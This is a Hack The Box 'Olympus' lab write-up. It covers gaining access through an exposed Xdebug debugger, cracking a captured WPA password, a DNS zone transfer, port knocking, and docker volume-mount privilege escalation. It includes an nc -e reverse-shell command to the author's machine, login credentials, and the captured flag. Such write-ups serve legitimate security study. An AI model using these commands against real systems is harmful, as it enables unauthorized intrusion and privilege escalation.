{"metadata":{"date":"Aug 15, 2019","title":"Hack The Box - Olympus Writeup","slug":"htb-olympus-writeup","template":"post","categories":["HTB"],"tags":["HTB"]},"content":"<p>I begun by scanning the box to find some interesting ports.</p>\n<pre><code class=\"hljs language-pgsql\">PORT     STATE    SERVICE <span class=\"hljs-keyword\">VERSION</span>\n<span class=\"hljs-number\">22</span>/tcp   filtered ssh\n<span class=\"hljs-number\">53</span>/tcp   <span class=\"hljs-keyword\">open</span>     <span class=\"hljs-keyword\">domain</span>  (<span class=\"hljs-type\">unknown</span> banner: Bind)\n<span class=\"hljs-number\">80</span>/tcp   <span class=\"hljs-keyword\">open</span>     http    Apache httpd\n<span class=\"hljs-number\">2222</span>/tcp <span class=\"hljs-keyword\">open</span>     ssh     (protocol <span class=\"hljs-number\">2.0</span>)\n</code></pre>\n<p>Port 80 was open so I visited the site and found a picture of the almighty God Zeus. I checked the response headers in the developer console and noticed the <code>xdebug</code> variable. According to my google fu, it's a PHP debugger which among other things, can be used to debug <a href=\"https://xdebug.org/docs/remote\"><em>remote</em></a> PHP applications.</p>\n<p>I continued to recon the web for more info and found the following links:</p>\n<p><a href=\"https://github.com/rapid7/metasploit-framework/pull/9916\">https://github.com/rapid7/metasploit-framework/pull/9916</a></p>\n<p><a href=\"https://github.com/rapid7/metasploit-framework/pull/9916\">https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface</a></p>\n<p>I used the script found in the last link. All you need to do is to setup a GET parameter and specify your attack IP in <code>X-FORWARDED-FOR</code>. I ran the <code>xdebug.py</code> script and sent the following HTTP request:</p>\n<pre><code class=\"hljs language-apache\"><span class=\"hljs-attribute\">GET</span> /index.php?XDEBUG_SESSION_START=phpstorm HTTP/<span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">1</span>\n<span class=\"hljs-attribute\">Host</span>: <span class=\"hljs-number\">10.10.10.83</span>\n<span class=\"hljs-attribute\">User</span>-Agent: Mozilla/<span class=\"hljs-number\">5</span>.<span class=\"hljs-number\">0</span> (X<span class=\"hljs-number\">11</span>; Windows x<span class=\"hljs-number\">86</span>_<span class=\"hljs-number\">64</span>; rv:<span class=\"hljs-number\">59</span>.<span class=\"hljs-number\">0</span>) Gecko/<span class=\"hljs-number\">20100101</span> Firefox/<span class=\"hljs-number\">59</span>.<span class=\"hljs-number\">0</span>\n<span class=\"hljs-attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">9</span>,*/*;q=<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">8</span>\n<span class=\"hljs-attribute\">Accept</span>-Language: en-US,en;q=<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">5</span>\n<span class=\"hljs-attribute\">Accept</span>-Encoding: gzip, deflate\n<span class=\"hljs-attribute\">Connection</span>: close\n<span class=\"hljs-attribute\">X</span>-FORWARDED-FOR: <span class=\"hljs-number\">10.10.14.7</span>\n<span class=\"hljs-attribute\">Upgrade</span>-Insecure-Requests: <span class=\"hljs-number\">1</span>\n<span class=\"hljs-attribute\">Cache</span>-Control: max-age=<span class=\"hljs-number\">0</span>\n</code></pre>\n<p>The machine connected back to my attack machine! Next I setup a listener <code>nc -lvp 1337</code> and ran the following command from <code>xdebug.py</code>: <code>system(\"nc -e /bin/bash 10.10.10.14.7 1337\")</code> which ran on the victim's box and created a reverse shell for me to use.</p>\n<h3>WHAT'S IN THE BOX!?!?</h3>\n<p>After gaining access I looked for <code>user.txt</code> but couldn't find it. After checking the home folder of <code>zeus</code>, checking the process list with <code>ps aux</code> and checking the root directory, I started to think this must be a docker container. I uploaded <code>linenum.sh</code> which later also reported to believe that the host was actually a docker container.</p>\n<p>The user <code>zeus</code> had downloaded the project <code>airgeddon</code> from github which is a tool for attacking wireless networks. Inside the project I found a .pcap file and a .txt file with the following message:</p>\n<pre><code class=\"hljs language-vhdl\">Captured <span class=\"hljs-keyword\">while</span> flying. I<span class=\"hljs-symbol\">'ll</span> banish him <span class=\"hljs-keyword\">to</span> Olympia - Zeus\n</code></pre>\n<p>I opened the .pcap file and realised it was encrypted WLAN traffic, so I fired up <code>aircrack-ng</code> and got crackin! After 40 minutes using <code>rockyou.txt</code> as my wordlist, I found the password: <code>flightoficarus</code>. Inside the .pcap I could see clients connecting to an accesspoint called: <code>Too_cl0se_to_th3_Sun</code>.</p>\n<p>I continued to scan the .pcap for more information but couldn't find anything. So I begun trying to SSH into the machine at port 2222 with different credentials, using greek mythology as my starting point. Everything I tried failed. One week later I try the same credentials again and voila, I had access. Why this didn't work the first time, I don't know. My guess is that people were hammering the machine hard so I timed out.</p>\n<pre><code class=\"hljs language-apache\"><span class=\"hljs-attribute\">icarus</span>:Too_cl<span class=\"hljs-number\">0</span>se_to_th<span class=\"hljs-number\">3</span>_Sun\n</code></pre>\n<p>Turned out this was an other docker container, I deduced that from the hostname and process list. There was only one file available, which had the following contents:</p>\n<pre><code class=\"hljs language-gams\">\n<span class=\"hljs-function\"><span class=\"hljs-title\">Athena</span></span> goddess will guide you through the dark...\n\n<span class=\"hljs-function\"><span class=\"hljs-title\">Way</span></span> to Rhodes...\nctfolympus.htb\n\n</code></pre>\n<p>Okey, so now I have a new domain, and port 53/tcp was open according to my port scan, that can only mean one thing...DNS ZONE TRANSFER!</p>\n<p>First I ran the following:</p>\n<pre><code class=\"hljs language-stylus\">root@kali:~/Sites/htb-notes/olympus/http_serve# host -l ctfolympus<span class=\"hljs-selector-class\">.htb</span> <span class=\"hljs-number\">10.10</span>.<span class=\"hljs-number\">10.83</span>\nUsing domain server:\nName: <span class=\"hljs-number\">10.10</span>.<span class=\"hljs-number\">10.83</span>\nAddress: <span class=\"hljs-number\">10.10</span>.<span class=\"hljs-number\">10.83</span>#<span class=\"hljs-number\">53</span>\nAliases: \n\nctfolympus<span class=\"hljs-selector-class\">.htb</span> has <span class=\"hljs-selector-tag\">address</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">0.120</span>\nctfolympus<span class=\"hljs-selector-class\">.htb</span> name server ns1<span class=\"hljs-selector-class\">.ctfolympus</span><span class=\"hljs-selector-class\">.htb</span>.\nctfolympus<span class=\"hljs-selector-class\">.htb</span> name server ns2<span class=\"hljs-selector-class\">.ctfolympus</span><span class=\"hljs-selector-class\">.htb</span>.\nmail<span class=\"hljs-selector-class\">.ctfolympus</span><span class=\"hljs-selector-class\">.htb</span> has <span class=\"hljs-selector-tag\">address</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">0.120</span>\nns1<span class=\"hljs-selector-class\">.ctfolympus</span><span class=\"hljs-selector-class\">.htb</span> has <span class=\"hljs-selector-tag\">address</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">0.120</span>\nns2<span class=\"hljs-selector-class\">.ctfolympus</span><span class=\"hljs-selector-class\">.htb</span> has <span class=\"hljs-selector-tag\">address</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">0.120</span>\n</code></pre>\n<p>Okey nice, lets run the dns zone transfer!</p>\n<pre><code class=\"hljs language-apache\"><span class=\"hljs-attribute\">root</span>@kali:~/Sites/htb-notes/olympus/http_serve# dig axfr @ctfolympus.htb ctfolympus.htb\n\n; <span class=\"hljs-section\">&#x3C;&#x3C;></span>> <span class=\"hljs-attribute\">DiG</span> <span class=\"hljs-number\">9</span>.<span class=\"hljs-number\">11</span>.<span class=\"hljs-number\">3</span>-<span class=\"hljs-number\">1</span>-Debian &#x3C;&#x3C;>> axfr @ctfolympus.htb ctfolympus.htb\n; (<span class=\"hljs-attribute\">1</span> server found)\n;; <span class=\"hljs-attribute\">global</span> options: +cmd\n<span class=\"hljs-attribute\">ctfolympus</span>.htb.\t\t<span class=\"hljs-number\">86400</span>\tIN\tSOA\tns<span class=\"hljs-number\">1</span>.ctfolympus.htb. ns<span class=\"hljs-number\">2</span>.ctfolympus.htb. <span class=\"hljs-number\">2018042301</span> <span class=\"hljs-number\">21600</span> <span class=\"hljs-number\">3600</span> <span class=\"hljs-number\">604800</span> <span class=\"hljs-number\">86400</span>\n<span class=\"hljs-attribute\">ctfolympus</span>.htb.\t\t<span class=\"hljs-number\">86400</span>\tIN\tTXT\t<span class=\"hljs-string\">\"prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!\"</span>\n<span class=\"hljs-attribute\">ctfolympus</span>.htb.\t\t<span class=\"hljs-number\">86400</span>\tIN\tA\t<span class=\"hljs-number\">192.168.0.120</span>\n<span class=\"hljs-attribute\">ctfolympus</span>.htb.\t\t<span class=\"hljs-number\">86400</span>\tIN\tNS\tns<span class=\"hljs-number\">1</span>.ctfolympus.htb.\n<span class=\"hljs-attribute\">ctfolympus</span>.htb.\t\t<span class=\"hljs-number\">86400</span>\tIN\tNS\tns<span class=\"hljs-number\">2</span>.ctfolympus.htb.\n<span class=\"hljs-attribute\">ctfolympus</span>.htb.\t\t<span class=\"hljs-number\">86400</span>\tIN\tMX\t<span class=\"hljs-number\">10</span> mail.ctfolympus.htb.\n<span class=\"hljs-attribute\">crete</span>.ctfolympus.htb.\t<span class=\"hljs-number\">86400</span>\tIN\tCNAME\tctfolympus.htb.\n<span class=\"hljs-attribute\">hades</span>.ctfolympus.htb.\t<span class=\"hljs-number\">86400</span>\tIN\tCNAME\tctfolympus.htb.\n<span class=\"hljs-attribute\">mail</span>.ctfolympus.htb.\t<span class=\"hljs-number\">86400</span>\tIN\tA\t<span class=\"hljs-number\">192.168.0.120</span>\n<span class=\"hljs-attribute\">ns1</span>.ctfolympus.htb.\t<span class=\"hljs-number\">86400</span>\tIN\tA\t<span class=\"hljs-number\">192.168.0.120</span>\n<span class=\"hljs-attribute\">ns2</span>.ctfolympus.htb.\t<span class=\"hljs-number\">86400</span>\tIN\tA\t<span class=\"hljs-number\">192.168.0.120</span>\n<span class=\"hljs-attribute\">rhodes</span>.ctfolympus.htb.\t<span class=\"hljs-number\">86400</span>\tIN\tCNAME\tctfolympus.htb.\n<span class=\"hljs-attribute\">RhodesColossus</span>.ctfolympus.htb. <span class=\"hljs-number\">86400</span> IN\tTXT\t<span class=\"hljs-string\">\"Here lies the great Colossus of Rhodes\"</span>\n<span class=\"hljs-attribute\">www</span>.ctfolympus.htb.\t<span class=\"hljs-number\">86400</span>\tIN\tCNAME\tctfolympus.htb.\n<span class=\"hljs-attribute\">ctfolympus</span>.htb.\t\t<span class=\"hljs-number\">86400</span>\tIN\tSOA\tns<span class=\"hljs-number\">1</span>.ctfolympus.htb. ns<span class=\"hljs-number\">2</span>.ctfolympus.htb. <span class=\"hljs-number\">2018042301</span> <span class=\"hljs-number\">21600</span> <span class=\"hljs-number\">3600</span> <span class=\"hljs-number\">604800</span> <span class=\"hljs-number\">86400</span>\n;; <span class=\"hljs-attribute\">Query</span> time: <span class=\"hljs-number\">46</span> msec\n;; <span class=\"hljs-attribute\">SERVER</span>: <span class=\"hljs-number\">10.10.10.83</span>#<span class=\"hljs-number\">53</span>(<span class=\"hljs-number\">10.10.10.83</span>)\n;; <span class=\"hljs-attribute\">WHEN</span>: Mon May <span class=\"hljs-number\">14</span> <span class=\"hljs-number\">19</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">19</span> CEST <span class=\"hljs-number\">2018</span>\n;; <span class=\"hljs-attribute\">XFR</span> size: <span class=\"hljs-number\">15</span> records (messages <span class=\"hljs-number\">1</span>, bytes <span class=\"hljs-number\">475</span>)\n</code></pre>\n<p>DNS zone transfer lets us get a copy of the zone file, so now we can see everything! The thing that stood out the most was:</p>\n<pre><code class=\"hljs language-apache\"><span class=\"hljs-attribute\">ctfolympus</span>.htb.\t\t<span class=\"hljs-number\">86400</span>\tIN\tTXT\t<span class=\"hljs-string\">\"prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!\"</span>\n</code></pre>\n<p>My thinking here was that the user <code>prometheus</code> needs to perform port knocking which will then open allow us to login via ssh on port 22, which was set to filtered according to my port scan.</p>\n<p>Easy peasy one liner:</p>\n<pre><code class=\"hljs language-apache\"><span class=\"hljs-attribute\">for</span> port in <span class=\"hljs-number\">3456</span> <span class=\"hljs-number\">8234</span> <span class=\"hljs-number\">62431</span>; do nc ctfolympus.htb $port <span class=\"hljs-number\">2</span>> /dev/null; done; sshpass -p 'St<span class=\"hljs-number\">34</span>l_th<span class=\"hljs-number\">3</span>_F<span class=\"hljs-number\">1</span>re!' ssh -o <span class=\"hljs-string\">\"StrictHostKeyChecking no\"</span> prometheus@ctfolympus.htb\n</code></pre>\n<p><code>sshpass</code> is a package which allows you to set the SSH password as an input parameter.</p>\n<pre><code class=\"hljs language-bash\">Welcome to\n                            \n    )         (             \n ( /(     )   )\\ )   (      \n )\\()) ( /(  (()/(  ))\\ (   \n((_)\\  )(_))  ((_))/((_))\\  \n| |(_)((_)_   _| |(_)) ((_) \n| <span class=\"hljs-string\">' \\ / _` |/ _` |/ -_)(_-&#x3C; \n|_||_|\\__,_|\\__,_|\\___|/__/ \n                           \nprometheus@olympus:~$\n</span></code></pre>\n<p>Aww yeee, we got access to the host machine and not some stupid container! Since I knew the host was running docker, I tried some commands to see what I could do, and to my surprise, I could do anything!</p>\n<p>In order to get <code>root.txt</code>, all we need to do is to simply start a container and map root's home directory into the container. First I tried to use a ubuntu image but that didn't work, so I checked <code>docker images</code> and picked one from there.</p>\n<pre><code class=\"hljs language-apache\"><span class=\"hljs-attribute\">prometheus</span>@olympus:~$ docker run --volume=/root:/volumes -i -t olympia /bin/bash\n<span class=\"hljs-attribute\">root</span>@<span class=\"hljs-number\">1</span>c<span class=\"hljs-number\">2</span>a<span class=\"hljs-number\">720</span>c<span class=\"hljs-number\">4</span>fa<span class=\"hljs-number\">5</span>:/#\n<span class=\"hljs-attribute\">root</span>@<span class=\"hljs-number\">1</span>c<span class=\"hljs-number\">2</span>a<span class=\"hljs-number\">720</span>c<span class=\"hljs-number\">4</span>fa<span class=\"hljs-number\">5</span>:/# ls /volumes/\n<span class=\"hljs-attribute\">root</span>.txt\n<span class=\"hljs-attribute\">root</span>@<span class=\"hljs-number\">1</span>c<span class=\"hljs-number\">2</span>a<span class=\"hljs-number\">720</span>c<span class=\"hljs-number\">4</span>fa<span class=\"hljs-number\">5</span>:/# cat /volumes/root.txt \n<span class=\"hljs-attribute\">aba486990e2e849e25c23f6e41e5e303</span>\n<span class=\"hljs-attribute\">root</span>@<span class=\"hljs-number\">1</span>c<span class=\"hljs-number\">2</span>a<span class=\"hljs-number\">720</span>c<span class=\"hljs-number\">4</span>fa<span class=\"hljs-number\">5</span>:/#\n</code></pre>\n<p>And there you go.</p>"}